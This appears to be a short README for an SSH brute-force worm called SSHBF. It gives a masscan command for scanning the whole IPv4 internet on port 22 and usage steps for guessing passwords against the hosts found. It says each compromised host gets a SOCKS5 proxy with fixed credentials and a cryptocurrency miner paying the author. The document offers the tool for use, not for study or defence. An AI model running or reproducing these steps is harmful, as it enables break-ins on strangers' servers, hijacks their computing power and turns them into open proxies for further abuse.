# Hello there. I'm SSHBF, an SSH bruteforce worm



## Scan IPS

```$ masscan -p22 --exclude 255.255.255.255 0.0.0.0/0  --rate=1000000000000 | grep port | awk '{ print $6 }' > hosts.txt```

### remember to CTRL+C it after near 5.000 IPs

## Usage:

### Put passwords in passwords.txt

### ```$ python3 main.py```


## What I do?

#### socks5://sshbf:sshbf@{host}:1080 is started
#### and miner on my crypto (donation to coder)
